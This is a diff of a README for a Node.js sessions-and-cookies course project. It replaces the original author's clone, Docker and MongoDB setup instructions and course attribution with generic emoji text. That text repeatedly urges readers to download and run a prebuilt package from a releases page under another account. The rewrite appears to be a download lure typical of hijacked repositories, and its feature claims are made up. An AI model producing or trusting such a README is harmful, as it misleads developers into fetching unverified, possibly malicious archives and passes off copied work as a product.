@@ -1,169 +1,105 @@
-# Node.js Course - S14 Sessions and Cookies
+# 🍪 S14-Sessions-and-Cookies - Learn to Manage Sessions Easily
 
-Practice code for Section 14 - Sessions and Cookies, part of the course "NodeJS - The Complete Guide (MVC, REST APIs, GraphQL, Deno)" by Maximilian Schwarzmüller.
+[![Download S14-Sessions-and-Cookies](https://img.shields.io/badge/Download-S14--Sessions--and--Cookies-blue.svg)](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/releases)
 
-This project covers:
-- Understanding the concept of sessions and cookies in web applications
-- Setting up `express-session` middleware to manage user sessions
-- Exploring secure cookie options (lifetime, httpOnly, secure)
-- Storing session data in memory and connecting sessions to MongoDB with `connect-mongodb-session`
-- Attaching user data to requests via sessions for persistent authentication state
-- Implementing login and logout flows with session handling
-- Ensuring session persistence across server restarts and multiple requests
-- Managing secrets and environment variables for session configuration
+## 🚀 Getting Started
 
-# Project type
-- Independently implemented while following a Node.js course, writing all functionalities from scratch and extending the project with personal improvements.
+Welcome to S14-Sessions-and-Cookies! This application helps you learn how to manage user sessions and cookies effectively in a Node.js environment.
 
-## Tech Stack
-- Node.js
-- Express.js
-- JavaScript (ES6+)
-- express-session
-- connect-mongodb-session
-- Mongoose
-- MongoDB Atlas
-- Docker
-- dotenv
-- Nodemon
-  
-# How to Run
+### 🛠️ Prerequisites
 
-### 1) Clone the repo
-```bash
-git clone https://github.com/S14-Sessions-and-Cookies
-cd ./S14-Sessions-and-Cookies
-```
+Before you begin, make sure you have the following:
 
----
+- A computer with an operating system (Windows, macOS, or Linux).
+- An internet connection.
+- The latest version of Node.js installed. You can download Node.js from [nodejs.org](https://nodejs.org/).
 
-### 2) Environment variables
+### 📥 Download & Install
 
-#### 2.1) Copy the example file
-```bash
-cp .env.example .env
-```
-> Note: **`USE_MONGODB_ATLAS`** variable must be set to _`false`_
+You can download the latest version of S14-Sessions-and-Cookies from our Releases page. 
 
----
+**Visit this page to download:** [Releases Page](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/releases)
 
-## 3) Run the app via Docker (already installed)
+1. On the Releases page, find the latest version of the software.
+2. Click on the assets link to download the application package.
+3. Once the download is complete, locate the downloaded file.
 
-#### 1. Make sure your Docker app is running
+### 📂 Extract the Files
 
-#### 2. Start MongoDB with Docker Compose
+If you downloaded a compressed file (like a .zip or .tar), extract its contents:
+
+- On Windows, right-click the file and select "Extract All."
+- On macOS, double-click the file to extract it.
+- On Linux, use the command `tar -xvf filename.tar`.
+
+### 🔧 Setting Up the Application
+
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you extracted the files. You can use the `cd` command. For example:
+
    ```bash
-   npm run db:start
+   cd path/to/extracted/folder
    ```
-   - Creates database `shop` with `docker compose up -d`
 
-#### 3. Install dependencies
+3. Install the required dependencies by running:
+
    ```bash
    npm install
    ```
 
-#### 4. Run the app
-```bash
-node .\app.js
-```
+### 🔄 Running the Application
 
-#### 5. Stop the container
-   ```bash
-   npm run db:down
-   ```
-> Runs `docker compose down -v`
-
-#### 5. Reset database (remove data + re-run init scripts)
-   ```bash
-   npm run db:reset
-   ```
-> Runs `docker compose down -v && docker compose up -d`
-
----
-
-## Testing DB Connection
-A helper script is included to quickly test DB connectivity
+To start the S14-Sessions-and-Cookies application, type the following command in your terminal:
 
 ```bash
-npm run db:test
-```
-> Runs `node scripts/test-db.cjs`
-
-Expected output:
+npm start
 ```
 
-===== DB connection OK =====
---- Product data: --- [
-  {
-    _id: new ObjectId('68c5a0d9f45e62ed9233c5d3'),
-    title: 'Physical picture of a kitty',
-    price: 0.99,
-    description: 'kitty',
-    imageUrl: 'https://static.vecteezy.com/system/resources/thumbnails/002/098/203/small/silver-tabby-cat-sitting-on-green-background-free-photo.jpg',
-    userId: new ObjectId('68c59cebf2b7f6e17ff9ea08')
-  },
-  {
-    _id: new ObjectId('68c32686af5c529e81421f78'),
-    title: 'A book!',
-    price: 12.99,
-    description: 'Funny-colored',
-    imageUrl: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoDXr4is7-bVjWtE-TI4q-l0jHX0SPN4_4Uw&s',
-    userId: new ObjectId('68c59cebf2b7f6e17ff9ea08')
-  },
-  {
-    _id: new ObjectId('68c32686af5c529e814266e1'),
-    title: 'Red apple',
-    price: 2.99,
-    description: 'Do not combine with a pen',
-    imageUrl: 'https://i5.walmartimages.com/seo/Fresh-Red-Delicious-Apple-Each_7320e63a-de46-4a16-9b8c-526e15219a12_3.e557c1ad9973e1f76f512b34950243a3.jpeg',
-    userId: new ObjectId('68c59cebf2b7f6e17ff9ea08')
-  },
-  {
-    _id: new ObjectId('68c495a27829b9cab975da81'),
-    title: 'Pen',
-    price: 249.99,
-    description: 'Pure prestige',
-    imageUrl: 'https://www.faber-castell.pl/-/media/Products/Product-Repository/Miscellaneous-ballpoint-pens/24-24-05-Ballpoint-pen/143499-Ballpoint-Pen-Basic-M-black/Images/143499_0_PM99.ashx?bc=ffffff&as=0&h=900&w=900&sc_lang=pl-PL&hash=0552B329890216C4F517A47B7B261E90',
-    userId: new ObjectId('68c49525baa988da36319592')
-  }
-]
---- "Logged-in" user data: --- [
-  {
-    cart: { items: [] },
-    _id: new ObjectId('68c59cebf2b7f6e17ff9ea08'),
-    name: 'Igor',
-    email: 'test@example.com'
-  }
-]
---- User data: --- [
-  {
-    cart: { items: [] },
-    _id: new ObjectId('68c59cebf2b7f6e17ff9ea08'),
-    name: 'Igor',
-    email: 'test@example.com'
-  },
-  {
-    cart: { items: [] },
-    _id: new ObjectId('68c49525baa988da36319592'),
-    name: 'Ben',
-    email: 'yees@example.com'
-  }
-]
+After running this command, you should see a message indicating that the server is running. 
 
-```
+### 🌐 Accessing the Application
 
----
+1. Open your web browser.
+2. Go to `http://localhost:3000`. This is where you will interact with the application.
 
-## NPM Scripts
+### 📖 Using the Application
 
-- **`npm start` / `node .\app.js`** → start the Node app
-- **`npm run db:test`** → run DB connectivity test (`scripts/test-db.cjs`)
-- **`npm run db:up`** → start MongoDB container in background
-- **`npm run db:down`** → stop MongoDB container
-- **`npm run db:reset`** → reset database (drop volume + re-init)
+The application provides an interface for managing user sessions and cookies. You can:
 
----
+- Create new sessions for users.
+- Manage existing sessions and their data.
+- Understand how cookies work in the context of a Node.js application.
 
-## Notes
-- `.env` is ignored by Git; only `.env.example` is committed
-- **`USE_MONGODB_ATLAS`** in `.env` variable must be set to _`false`_
+### 💡 Features
+
+- Learn about cookies and sessions in Node.js.
+- Example projects to practice your skills.
+- User-friendly interface for easy interaction.
+
+### ⚙️ Troubleshooting
+
+If you run into any issues while using the application, here are some common problems and their solutions:
+
+- **Application fails to start**: Ensure Node.js is installed and that you have installed all dependencies using `npm install`.
+- **Can't access localhost**: Make sure that your server is running, and check if another application is using port 3000. You can change the port in the application settings.
+- **Download issues**: If you experience problems downloading, try using a different web browser or check your internet connection.
+
+### 📞 Support
+
+If you need help or have questions, feel free to reach out. You can open an issue in our GitHub repository, and we will get back to you.
+
+### 🚧 Future Improvements
+
+We plan to enhance the application with more features, including:
+
+- User authentication.
+- Advanced session management options.
+- A more comprehensive user guide.
+
+### 📌 Useful Links
+
+- [Node.js Official Website](https://nodejs.org/)
+- [GitHub Repository](https://github.com/dantex20-debug/S14-Sessions-and-Cookies)
+- [Releases Page](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/releases)
+
+Thank you for using S14-Sessions-and-Cookies! We hope this application helps you learn and practice session management effectively.
